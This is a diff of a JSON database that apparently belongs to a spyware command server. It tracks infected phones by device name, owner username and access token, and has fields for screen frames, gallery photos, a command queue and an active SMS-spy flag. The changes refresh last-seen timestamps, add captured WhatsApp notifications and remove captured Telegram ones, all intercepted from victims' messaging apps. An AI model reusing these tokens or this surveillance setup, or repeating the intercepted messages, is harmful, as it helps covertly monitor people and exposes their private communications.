@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776782710795,
+    "lastSeen": 1776782732034,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776782711171,
+    "lastSeen": 1776782729636,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim file kepada bintang",
+        "time": "21/04 21:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782732376
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim pesan…",
+        "time": "21/04 21:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782732350
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14386,22 +14402,6 @@
         "time": "21/04 21:24",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776781498529
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776781498515
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776781498469
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776782712132,
+    "lastSeen": 1776782730513,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -20699,7 +20699,7 @@
     "deviceName": "HP-DEVABIL333-69AC",
     "ownerUsername": "Fibersec",
     "token": "a998090dbff92d6435ed4f2edf5c08f6",
-    "lastSeen": 1776782710887,
+    "lastSeen": 1776782726336,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T14:42:17.817Z",
